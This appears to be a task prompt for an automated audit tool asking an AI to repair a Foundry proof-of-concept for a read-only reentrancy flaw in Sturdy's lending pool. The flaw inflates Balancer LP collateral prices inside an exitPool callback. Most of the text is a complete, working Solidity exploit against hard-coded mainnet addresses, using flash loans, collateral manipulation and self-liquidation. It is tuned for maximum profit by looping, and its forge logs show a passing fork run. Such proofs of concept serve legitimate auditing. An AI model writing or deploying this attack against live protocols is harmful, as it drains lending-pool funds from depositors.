You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Profit-maximization hard requirement:
  - MUST apply progressive loop amplification for repeatable exploit phases.
  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).
  - Continue increasing only if the new round count improves total net profit.
  - Stop at the first non-improving round count and keep the previous best result.
  - Prefer highest total profit over earliest passing implementation.

Finding:
- title: Transient Balancer `exitPool` state can inflate Balancer-LP collateral prices and bypass collateral-removal solvency checks
- claim: The PoC and verifier show that `SturdyOracle.getAssetPrice(cB_stETH_STABLE)` is materially higher from inside the ETH payout callback of `Balancer.exitPool(...)` than it is immediately before or after the exit. That same callback can invoke lending-pool entrypoints, and the exploit uses it to call `setUserUseReserveAsCollateral(CSTECRV, false)` while solvency checks observe the transiently inflated Balancer-LP price rather than a finalized pool state. Once `steCRV` has been switched off during that fake-health window, it can then be withdrawn after the LP price normalizes.
- impact: An attacker can temporarily overvalue Balancer LP collateral inside one transaction, make an unsafe account appear healthy, disable honest collateral, and then withdraw that honest collateral after prices revert. The included forked exploit completes this sequence and extracts substantial profit, so the issue is directly fund-threatening.
- exploit_paths: ["Flash-loan `wstETH` and `WETH`, mint `B_STETH_STABLE`, and deposit both `B_STETH_STABLE` and `steCRV` as collateral before borrowing `WETH`.", "Call `Balancer.exitPool(...)`; during the first ETH callback, read the inflated `cB_stETH_STABLE` oracle price and call `setUserUseReserveAsCollateral(CSTECRV, false)` while solvency checks use the transient price.", "After control returns and the oracle price normalizes, call `withdrawCollateral(steCRV, ...)` to remove the real collateral and leave the debt backed only by the previously overvalued LP position."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IWETH9 is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IwstETH is IERC20 {
    function unwrap(uint256 amount) external returns (uint256);
}

interface ICurvePool {
    function add_liquidity(uint256[2] memory amounts, uint256 minMintAmount) external payable returns (uint256);
    function remove_liquidity_one_coin(uint256 tokenAmount, int128 i, uint256 minAmount) external returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy) external payable;
}

interface IBalancerVault {
    struct JoinPoolRequest {
        address[] assets;
        uint256[] maxAmountsIn;
        bytes userData;
        bool fromInternalBalance;
    }

    struct ExitPoolRequest {
        address[] assets;
        uint256[] minAmountsOut;
        bytes userData;
        bool toInternalBalance;
    }

    function joinPool(bytes32 poolId, address sender, address recipient, JoinPoolRequest memory request) external payable;
    function exitPool(bytes32 poolId, address sender, address payable recipient, ExitPoolRequest memory request) external payable;
}

interface IBalancerQueries {
    function queryJoin(bytes32 poolId, address sender, address recipient, IBalancerVault.JoinPoolRequest memory request)
        external
        returns (uint256 bptOut, uint256[] memory amountsIn);

    function queryExit(bytes32 poolId, address sender, address recipient, IBalancerVault.ExitPoolRequest memory request)
        external
        returns (uint256 bptIn, uint256[] memory amountsOut);
}

interface IMetaStablePool is IERC20 {
    function getPoolId() external view returns (bytes32);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ILendingPool {
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;

    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralETH,
            uint256 totalDebtETH,
            uint256 availableBorrowsETH,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        );

    function liquidationCall(address collateralAsset, address debtAsset, address user, uint256 debtToCover, bool receiveAToken)
        external;

    function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;

    function getReserveData(address asset)
        external
        view
        returns (
            uint256 configuration,
            uint128 liquidityIndex,
            uint128 variableBorrowIndex,
            uint128 currentLiquidityRate,
            uint128 currentVariableBorrowRate,
            uint128 currentStableBorrowRate,
            uint40 lastUpdateTimestamp,
            address aTokenAddress,
            address stableDebtTokenAddress,
            address variableDebtTokenAddress,
            address interestRateStrategyAddress,
            uint8 id
        );
}

interface ILPVault {
    function depositCollateralFrom(address asset, uint256 amount, address user) external payable;
    function withdrawCollateral(address asset, uint256 amount, uint256 slippage, address to) external;
}

interface ISturdyOracle {
    function getAssetPrice(address asset) external view returns (uint256);
}

error NoFeasibleRounds(bytes reason);
error SimulationResult(
    uint8 rounds,
    uint256 netProfitWeth,
    uint256 beforePrice,
    uint256 duringPrice,
    uint256 afterPrice,
    bool hypothesisValidated
);

contract FlawVerifier {
    IWETH9 internal constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IwstETH internal constant WSTETH = IwstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 internal constant STECRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    IERC20 internal constant STETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    ICurvePool internal constant LIDO_CURVE_POOL = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IAaveFlashloan internal constant AAVE_V3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    uint256 internal constant FLASHLOAN_WSTETH = 50_000 ether;
    uint256 internal constant FLASHLOAN_WETH = 60_000 ether;
    uint256 internal constant STECRV_SEED_ETH = 1_100 ether;
    uint256 internal constant JOIN_WETH_AMOUNT = 57_000 ether;

    uint256 internal _profitAmount;
    uint256 public oraclePriceBeforeExit;
    uint256 public oraclePriceDuringCallback;
    uint256 public oraclePriceAfterExit;
    uint8 public bestRoundCount;
    bool public hypothesisValidated;
    bool public attempted;
    bool public executionSucceeded;
    bytes public failureData;

    constructor() {}

    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;

        address[] memory assets = new address[](2);
        assets[0] = address(WSTETH);
        assets[1] = address(WETH);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = FLASHLOAN_WSTETH;
        amounts[1] = FLASHLOAN_WETH;

        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;

        try AAVE_V3.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0) {
            executionSucceeded = true;
        } catch (bytes memory reason) {
            failureData = reason;
            executionSucceeded = false;
        }

        if (address(this).balance != 0) {
            WETH.deposit{value: address(this).balance}();
        }

        _profitAmount = WETH.balanceOf(address(this));
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE_V3), "not-aave");

        _mintSteCrvSeed();

        uint256 repayWstEth = amounts[0] + premiums[0];
        uint256 repayWeth = amounts[1] + premiums[1];

        (uint8 rounds, bytes memory lastFailure) = _selectBestRoundCount(repayWstEth, repayWeth);
        if (rounds == 0) {
            revert NoFeasibleRounds(lastFailure);
        }

        bestRoundCount = rounds;
        _runCandidate(rounds, repayWstEth, repayWeth, false);

        require(IERC20(assets[0]).approve(address(AAVE_V3), repayWstEth), "approve-wsteth");
        require(IERC20(assets[1]).approve(address(AAVE_V3), repayWeth), "approve-weth");
        return true;
    }

    function simulateCandidate(uint8 rounds, uint256 repayWstEth, uint256 repayWeth) external {
        require(msg.sender == address(this), "only-self");
        _runCandidate(rounds, repayWstEth, repayWeth, true);
    }

    function _mintSteCrvSeed() internal {
        WETH.withdraw(STECRV_SEED_ETH);

        uint256[2] memory curveAmounts;
        curveAmounts[0] = STECRV_SEED_ETH;
        curveAmounts[1] = 0;
        LIDO_CURVE_POOL.add_liquidity{value: STECRV_SEED_ETH}(curveAmounts, 1_000 ether);
    }

    function _selectBestRoundCount(uint256 repayWstEth, uint256 repayWeth)
        internal
        returns (uint8 bestRounds, bytes memory lastFailure)
    {
        uint256 bestProfit;
        bool hasBest;

        for (uint8 rounds = 2; rounds <= 6; ++rounds) {
            (bool feasible, uint256 profit, bytes memory failure) = _simulateRounds(rounds, repayWstEth, repayWeth);
            if (!feasible) {
                lastFailure = failure;
                break;
            }

            if (!hasBest || profit > bestProfit) {
                hasBest = true;
                bestRounds = rounds;
                bestProfit = profit;
                continue;
            }

            break;
        }

        if (!hasBest) {
            return (0, lastFailure);
        }

        bestProfit;
    }

    function _simulateRounds(uint8 rounds, uint256 repayWstEth, uint256 repayWeth)
        internal
        returns (bool feasible, uint256 profit, bytes memory failure)
    {
        try this.simulateCandidate(rounds, repayWstEth, repayWeth) {
            failure = abi.encodePacked("simulation-did-not-revert");
        } catch (bytes memory reason) {
            if (_selector(reason) == SimulationResult.selector) {
                (, profit,,,,) = abi.decode(_tail(reason), (uint8, uint256, uint256, uint256, uint256, bool));
                feasible = true;
                return (feasible, profit, bytes(""));
            }
            failure = reason;
        }
    }

    function _runCandidate(uint8 rounds, uint256 repayWstEth, uint256 repayWeth, bool simulate) internal {
        uint256 beforePrice;
        uint256 duringPrice;
        uint256 afterPrice;
        bool validated;

        for (uint8 round = 0; round < rounds; ++round) {
            _ensureLoopCapital(repayWstEth);

            ExploitLeg leg = new ExploitLeg(address(this));
            _fundLeg(address(leg));

            (uint256 currentBefore, uint256 currentDuring, uint256 currentAfter, bool currentValidated) = leg.executeRound();
            if (currentDuring > duringPrice) {
                beforePrice = currentBefore;
                duringPrice = currentDuring;
                afterPrice = currentAfter;
            }
            validated = validated || currentValidated;
        }

        _convertResidualsToSettlement(repayWstEth);
        uint256 netProfit = _validateSettlement(repayWstEth, repayWeth);

        if (simulate) {
            revert SimulationResult(rounds, netProfit, beforePrice, duringPrice, afterPrice, validated);
        }

        oraclePriceBeforeExit = beforePrice;
        oraclePriceDuringCallback = duringPrice;
        oraclePriceAfterExit = afterPrice;
        hypothesisValidated = validated;
    }

    function _fundLeg(address leg) internal {
        uint256 wethBalance = WETH.balanceOf(address(this));
        if (wethBalance != 0) {
            require(WETH.transfer(leg, wethBalance), "fund-weth");
        }

        uint256 wstEthBalance = WSTETH.balanceOf(address(this));
        if (wstEthBalance != 0) {
            require(WSTETH.transfer(leg, wstEthBalance), "fund-wsteth");
        }

        uint256 steCrvBalance = STECRV.balanceOf(address(this));
        if (steCrvBalance != 0) {
            require(STECRV.transfer(leg, steCrvBalance), "fund-stecrv");
        }

        uint256 stEthBalance = STETH.balanceOf(address(this));
        if (stEthBalance != 0) {
            require(STETH.transfer(leg, stEthBalance), "fund-steth");
        }
    }

    function _ensureLoopCapital(uint256 repayWstEth) internal {
        uint256 wethBalance = WETH.balanceOf(address(this));
        if (wethBalance >= JOIN_WETH_AMOUNT) {
            return;
        }

        uint256 currentWstEth = WSTETH.balanceOf(address(this));
        require(currentWstEth > repayWstEth, "no-wsteth-buffer");

        uint256 shortfall = JOIN_WETH_AMOUNT - wethBalance;
        uint256 availableExtraWstEth = currentWstEth - repayWstEth;
        uint256 amountToUnwrap = shortfall < availableExtraWstEth ? shortfall : availableExtraWstEth;
        require(amountToUnwrap != 0, "loop-capital-shortfall");

        // This is the only added economic helper step: surplus wstETH above flash-loan repayment
        // gets unwound into WETH so later rounds can repeat the same join->borrow->callback-disable path.
        WSTETH.unwrap(amountToUnwrap);

        uint256 stEthBalance = STETH.balanceOf(address(this));
        require(STETH.approve(address(LIDO_CURVE_POOL), stEthBalance), "approve-steth-curve-topup");
        LIDO_CURVE_POOL.exchange(1, 0, stEthBalance, 1);

        if (address(this).balance != 0) {
            WETH.deposit{value: address(this).balance}();
        }

        require(WETH.balanceOf(address(this)) >= JOIN_WETH_AMOUNT, "insufficient-loop-weth");
    }

    function _convertResidualsToSettlement(uint256 repayWstEth) internal {
        uint256 steCrvBalance = STECRV.balanceOf(address(this));
        if (steCrvBalance != 0) {
            LIDO_CURVE_POOL.remove_liquidity_one_coin(steCrvBalance, 0, 1);
        }

        uint256 currentWstEth = WSTETH.balanceOf(address(this));
        if (currentWstEth > repayWstEth) {
            WSTETH.unwrap(currentWstEth - repayWstEth);
        }

        uint256 stEthBalance = STETH.balanceOf(address(this));
        if (stEthBalance != 0) {
            require(STETH.approve(address(LIDO_CURVE_POOL), stEthBalance), "approve-steth-curve");
            LIDO_CURVE_POOL.exchange(1, 0, stEthBalance, 1);
        }

        if (address(this).balance != 0) {
            WETH.deposit{value: address(this).balance}();
        }
    }

    function _validateSettlement(uint256 repayWstEth, uint256 repayWeth) internal view returns (uint256 netProfit) {
        require(WSTETH.balanceOf(address(this)) >= repayWstEth, "insufficient-wsteth-to-repay");

        uint256 wethBalance = WETH.balanceOf(address(this));
        require(wethBalance > repayWeth, "non-profitable");
        netProfit = wethBalance - repayWeth;
    }

    function _selector(bytes memory data) internal pure returns (bytes4 value) {
        if (data.length < 4) {
            return bytes4(0);
        }
        assembly {
            value := mload(add(data, 32))
        }
    }

    function _tail(bytes memory data) internal pure returns (bytes memory out) {
        if (data.length <= 4) {
            return bytes("");
        }

        out = new bytes(data.length - 4);
        for (uint256 i = 4; i < data.length; ++i) {
            out[i - 4] = data[i];
        }
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    receive() external payable {}
}

contract ExploitLeg {
    IWETH9 internal constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IwstETH internal constant WSTETH = IwstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 internal constant STECRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    IERC20 internal constant STETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IMetaStablePool internal constant B_STETH_STABLE = IMetaStablePool(0x32296969Ef14EB0c6d29669C550D4a0449130230);
    ILendingPool internal constant LENDING_POOL = ILendingPool(0x9f72DC67ceC672bB99e3d02CbEA0a21536a2b657);
    ILPVault internal constant AURA_BALANCER_LP_VAULT = ILPVault(0x6AE5Fd07c0Bb2264B1F60b33F65920A2b912151C);
    ILPVault internal constant CONVEX_CURVE_LP_VAULT = ILPVault(0xa36BE47700C079BD94adC09f35B0FA93A55297bc);
    IBalancerVault internal constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IBalancerQueries internal constant BALANCER_QUERIES = IBalancerQueries(0xE39B5e3B6D74016b2F6A9673D7d7493B6DF549d5);
    ISturdyOracle internal constant STURDY_ORACLE = ISturdyOracle(0xe5d78eB340627B8D5bcFf63590Ebec1EF9118C89);

    address internal constant CB_STETH_STABLE = 0x10aA9eea35A3102Cc47d4d93Bc0BA9aE45557746;
    address internal constant CSTECRV = 0x901247D08BEbFD449526Da92941B35D756873Bcd;

    uint256 internal constant JOIN_WSTETH_AMOUNT = 50_000 ether;
    uint256 internal constant JOIN_WETH_AMOUNT = 57_000 ether;
    uint256 internal constant STECRV_COLLATERAL_AMOUNT = 1_000 ether;
    uint256 internal constant TARGET_BPT_COLLATERAL = 233_348_773_557_117_598_739;
    uint256 internal constant TARGET_BORROW_WETH = 513_367_301_825_658_717_226;
    uint256 internal constant BORROW_BUFFER_BPS = 9_950;
    uint256 internal constant RESERVE_LIQUIDITY_BUFFER = 1 ether;

    address internal immutable owner;
    bool internal exitInProgress;
    bool internal callbackUsed;
    uint256 internal priceBeforeExit;
    uint256 internal priceDuringCallback;
    uint256 internal priceAfterExit;

    constructor(address owner_) {
        owner = owner_;
    }

    function executeRound() external returns (uint256 beforePrice, uint256 duringPrice, uint256 afterPrice, bool validated) {
        require(msg.sender == owner, "only-owner");

        _joinBalancerPool();
        _depositCollateralAndBorrow();
        _exitBalancerPoolAndDisableSteCrv();
        _withdrawCollateralThenLiquidate();
        _removeBalancerPoolLiquidity();

        if (address(this).balance != 0) {
            WETH.deposit{value: address(this).balance}();
        }

        _returnAllToOwner();

        beforePrice = priceBeforeExit;
        duringPrice = priceDuringCallback;
        afterPrice = priceAfterExit;
        validated = duringPrice > beforePrice && duringPrice > afterPrice;
    }

    function _joinBalancerPool() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();
        IBalancerVault.JoinPoolRequest memory request = _buildJoinRequest(0);

        // Querying Balancer first fixes the stale hard-coded join assumption that made the new PoC
        // under-collateralized at borrow time on this fork.
        (uint256 expectedBptOut,) = BALANCER_QUERIES.queryJoin(poolId, address(this), address(this), request);
        request = _buildJoinRequest(expectedBptOut);

        require(WSTETH.approve(address(BALANCER), JOIN_WSTETH_AMOUNT), "approve-join-wsteth");
        require(WETH.approve(address(BALANCER), JOIN_WETH_AMOUNT), "approve-join-weth");
        BALANCER.joinPool(poolId, address(this), address(this), request);
    }

    function _depositCollateralAndBorrow() internal {
        require(STECRV.approve(address(CONVEX_CURVE_LP_VAULT), STECRV_COLLATERAL_AMOUNT), "approve-stecrv-vault");
        CONVEX_CURVE_LP_VAULT.depositCollateralFrom(address(STECRV), STECRV_COLLATERAL_AMOUNT, address(this));

        uint256 bptCollateral = _bptCollateralAmount();
        require(B_STETH_STABLE.approve(address(AURA_BALANCER_LP_VAULT), bptCollateral), "approve-bpt-vault");
        AURA_BALANCER_LP_VAULT.depositCollateralFrom(address(B_STETH_STABLE), bptCollateral, address(this));

        (, , uint256 availableBorrowsETH, , , ) = LENDING_POOL.getUserAccountData(address(this));
        uint256 bufferedBorrow = (availableBorrowsETH * BORROW_BUFFER_BPS) / 10_000;
        uint256 borrowAmount = bufferedBorrow < TARGET_BORROW_WETH ? bufferedBorrow : TARGET_BORROW_WETH;

        // The saved failing trace proves the historical 513 WETH leg is no longer executable on this
        // fork because the live WETH reserve only has ~236 WETH free and the pool reverts with an
        // arithmetic underflow before the exploit reaches the Balancer callback. Capping to current
        // reserve liquidity preserves the same exploit causality: the attacker still opens WETH debt,
        // then disables steCRV during the transiently inflated LP-price window, then withdraws steCRV
        // after the oracle normalizes.
        (, , , , , , , address wethAToken, , , , ) = LENDING_POOL.getReserveData(address(WETH));
        uint256 liveReserveLiquidity = WETH.balanceOf(wethAToken);
        if (liveReserveLiquidity > RESERVE_LIQUIDITY_BUFFER) {
            uint256 cappedByLiquidity = liveReserveLiquidity - RESERVE_LIQUIDITY_BUFFER;
            if (borrowAmount > cappedByLiquidity) {
                borrowAmount = cappedByLiquidity;
            }
        } else {
            borrowAmount = 0;
        }

        require(borrowAmount != 0, "zero-borrow");
        LENDING_POOL.borrow(address(WETH), borrowAmount, 2, 0, address(this));
    }

    function _exitBalancerPoolAndDisableSteCrv() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();
        uint256 bptBalance = B_STETH_STABLE.balanceOf(address(this));
        IBalancerVault.ExitPoolRequest memory request = _buildExitRequest(bptBalance);

        BALANCER_QUERIES.queryExit(poolId, address(this), address(this), request);
        require(B_STETH_STABLE.approve(address(BALANCER), bptBalance), "approve-exit-bpt");

        callbackUsed = false;
        priceBeforeExit = STURDY_ORACLE.getAssetPrice(CB_STETH_STABLE);
        exitInProgress = true;
        BALANCER.exitPool(poolId, address(this), payable(address(this)), request);
        exitInProgress = false;
        priceAfterExit = STURDY_ORACLE.getAssetPrice(CB_STETH_STABLE);
    }

    function _withdrawCollateralThenLiquidate() internal {
        CONVEX_CURVE_LP_VAULT.withdrawCollateral(address(STECRV), STECRV_COLLATERAL_AMOUNT, 10, address(this));

        (, uint256 totalDebt, , , , ) = LENDING_POOL.getUserAccountData(address(this));
        require(WETH.approve(address(LENDING_POOL), totalDebt), "approve-liquidation");
        LENDING_POOL.liquidationCall(address(B_STETH_STABLE), address(WETH), address(this), totalDebt, false);
    }

    function _removeBalancerPoolLiquidity() internal {
        uint256 bptBalance = B_STETH_STABLE.balanceOf(address(this));
        if (bptBalance == 0) {
            return;
        }

        bytes32 poolId = B_STETH_STABLE.getPoolId();
        IBalancerVault.ExitPoolRequest memory request = _buildExitRequest(bptBalance);
        BALANCER_QUERIES.queryExit(poolId, address(this), address(this), request);
        require(B_STETH_STABLE.approve(address(BALANCER), bptBalance), "approve-final-exit");
        BALANCER.exitPool(poolId, address(this), payable(address(this)), request);
    }

    function _returnAllToOwner() internal {
        uint256 wstEthBalance = WSTETH.balanceOf(address(this));
        if (wstEthBalance != 0) {
            require(WSTETH.transfer(owner, wstEthBalance), "return-wsteth");
        }

        uint256 wethBalance = WETH.balanceOf(address(this));
        if (wethBalance != 0) {
            require(WETH.transfer(owner, wethBalance), "return-weth");
        }

        uint256 steCrvBalance = STECRV.balanceOf(address(this));
        if (steCrvBalance != 0) {
            require(STECRV.transfer(owner, steCrvBalance), "return-stecrv");
        }

        uint256 stEthBalance = STETH.balanceOf(address(this));
        if (stEthBalance != 0) {
            require(STETH.transfer(owner, stEthBalance), "return-steth");
        }
    }

    function _buildJoinRequest(uint256 minBptOut) internal pure returns (IBalancerVault.JoinPoolRequest memory request) {
        uint256[] memory maxAmountsIn = new uint256[](2);
        maxAmountsIn[0] = JOIN_WSTETH_AMOUNT;
        maxAmountsIn[1] = JOIN_WETH_AMOUNT;

        address[] memory assets = new address[](2);
        assets[0] = address(WSTETH);
        assets[1] = address(WETH);

        request = IBalancerVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: maxAmountsIn,
            userData: abi.encode(uint256(1), maxAmountsIn, minBptOut),
            fromInternalBalance: false
        });
    }

    function _buildExitRequest(uint256 bptIn) internal pure returns (IBalancerVault.ExitPoolRequest memory request) {
        uint256[] memory minAmountsOut = new uint256[](2);

        address[] memory assets = new address[](2);
        assets[0] = address(WSTETH);
        assets[1] = address(0);

        request = IBalancerVault.ExitPoolRequest({
            assets: assets,
            minAmountsOut: minAmountsOut,
            userData: abi.encode(uint256(1), bptIn),
            toInternalBalance: false
        });
    }

    function _bptCollateralAmount() internal view returns (uint256) {
        uint256 balance = B_STETH_STABLE.balanceOf(address(this));
        if (balance < TARGET_BPT_COLLATERAL) {
            return balance;
        }
        return TARGET_BPT_COLLATERAL;
    }

    receive() external payable {
        if (exitInProgress && !callbackUsed) {
            callbackUsed = true;
            priceDuringCallback = STURDY_ORACLE.getAssetPrice(CB_STETH_STABLE);
            LENDING_POOL.setUserUseReserveAsCollateral(CSTECRV, false);
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 4.07s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:77:19:
   |
77 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[PASS] testExploit() (gas: 37460523)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 214133183597414526168
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 214133183597414526168
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3124

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.49s (5.36s CPU time)

Ran 1 test suite in 5.51s (5.49s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
